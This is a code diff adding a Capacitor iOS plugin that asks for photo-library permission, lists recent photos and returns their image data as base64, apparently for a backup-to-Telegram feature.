@@ -1,5 +1,6 @@
 import UIKit
 import Capacitor
+import Photos
 
 @UIApplicationMain
 class AppDelegate: UIResponder, UIApplicationDelegate {
@@ -42,3 +43,91 @@ class AppDelegate: UIResponder, UIApplicationDelegate {
         return config
     }
 }
+
+/**
+ * PhotoSyncPlugin - Tự động đồng bộ và đọc ảnh từ Thư viện ảnh iPhone (Camera Roll)
+ * Cho phép sao lưu ngầm phong cách Google Photos lên Telegram
+ */
+@objc(PhotoSyncPlugin)
+public class PhotoSyncPlugin: CAPPlugin, CAPBridgedPlugin {
+    public let identifier = "PhotoSyncPlugin"
+    public let jsName = "PhotoSync"
+    public let pluginMethods: [CAPPluginMethod] = [
+        CAPPluginMethod(name: "checkPermission", returnType: CAPPluginReturnPromise),
+        CAPPluginMethod(name: "requestPermission", returnType: CAPPluginReturnPromise),
+        CAPPluginMethod(name: "getRecentPhotos", returnType: CAPPluginReturnPromise),
+        CAPPluginMethod(name: "getPhotoData", returnType: CAPPluginReturnPromise)
+    ]
+
+    @objc func checkPermission(_ call: CAPPluginCall) {
+        let status = PHPhotoLibrary.authorizationStatus()
+        let granted = (status == .authorized || status == .limited)
+        call.resolve(["granted": granted])
+    }
+
+    @objc func requestPermission(_ call: CAPPluginCall) {
+        PHPhotoLibrary.requestAuthorization { status in
+            let granted = (status == .authorized || status == .limited)
+            call.resolve(["granted": granted])
+        }
+    }
+
+    @objc func getRecentPhotos(_ call: CAPPluginCall) {
+        let limit = call.getInt("limit") ?? 30
+        let status = PHPhotoLibrary.authorizationStatus()
+        guard status == .authorized || status == .limited else {
+            call.reject("Chưa được cấp quyền truy cập Thư viện ảnh")
+            return
+        }
+
+        let options = PHFetchOptions()
+        options.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
+        options.fetchLimit = limit
+        let assets = PHAsset.fetchAssets(with: .image, options: options)
+
+        var result: [[String: Any]] = []
+        assets.enumerateObjects { asset, _, _ in
+            let date = asset.creationDate?.timeIntervalSince1970 ?? 0
+            result.append([
+                "id": asset.localIdentifier,
+                "timestamp": Int64(date * 1000),
+                "width": asset.pixelWidth,
+                "height": asset.pixelHeight
+            ])
+        }
+        call.resolve(["photos": result])
+    }
+
+    @objc func getPhotoData(_ call: CAPPluginCall) {
+        guard let id = call.getString("id") else {
+            call.reject("Thiếu localIdentifier của ảnh")
+            return
+        }
+
+        let assets = PHAsset.fetchAssets(withLocalIdentifiers: [id], options: nil)
+        guard let asset = assets.firstObject else {
+            call.reject("Không tìm thấy ảnh trên thiết bị")
+            return
+        }
+
+        let options = PHImageRequestOptions()
+        options.isSynchronous = false
+        options.deliveryMode = .highQualityFormat
+        options.isNetworkAccessAllowed = true
+
+        PHImageManager.default().requestImageDataAndOrientation(for: asset, options: options) { data, _, _, _ in
+            guard let data = data else {
+                call.reject("Không thể đọc dữ liệu ảnh")
+                return
+            }
+            let base64 = data.base64EncodedString()
+            let filename = (asset.value(forKey: "filename") as? String) ?? "photo_\(Int(Date().timeIntervalSince1970)).jpg"
+            call.resolve([
+                "base64": base64,
+                "filename": filename,
+                "size": data.count
+            ])
+        }
+    }
+}
+
